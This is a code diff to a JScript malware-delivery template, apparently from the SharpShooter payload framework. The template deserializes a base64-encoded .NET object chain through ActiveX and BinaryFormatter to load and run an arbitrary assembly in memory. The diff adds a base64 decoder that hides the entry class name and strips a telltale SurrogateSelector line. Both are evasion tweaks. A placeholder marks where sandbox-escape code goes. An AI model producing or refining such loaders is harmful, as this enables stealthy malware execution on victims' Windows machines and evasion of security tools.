@@ -14,6 +14,27 @@ function base64ToStream(b) {
 	return ms;
 }
 
+function b64d(b) {
+       var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
+       var el = xmlDom.createElement("tmp");
+       el.dataType = "bin.Base64"
+       el.text = b;
+
+       var strm = new ActiveXObject("ADODB.Stream");
+       strm.Type = 1;
+       strm.Open();
+       strm.Write(el.nodeTypedValue);
+
+       strm.Position = 0;
+       strm.Type = 2;
+       strm.CharSet = "utf-8";
+
+       var res = strm.ReadText();
+       strm.Close();
+
+       return res;
+}
+
 var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
 "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
 "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
@@ -226,16 +247,15 @@ var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYW
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
 "AAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlvbi5Bc3Nl"+
 "bWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
-var entry_class = 'SharpShooter';
+var entry_class = b64d('U2hhcnBTaG9vdGVy');
 
 try {
 	setversion();
 	var stm = base64ToStream(serialized_obj);
 	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
 	var al = new ActiveXObject('System.Collections.ArrayList');
-	var n = fmt.SurrogateSelector;
 	var d = fmt.Deserialize_2(stm);
-	al.Add(n);
+	al.Add(undefined);
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
 	
 %SANDBOX_ESCAPES%
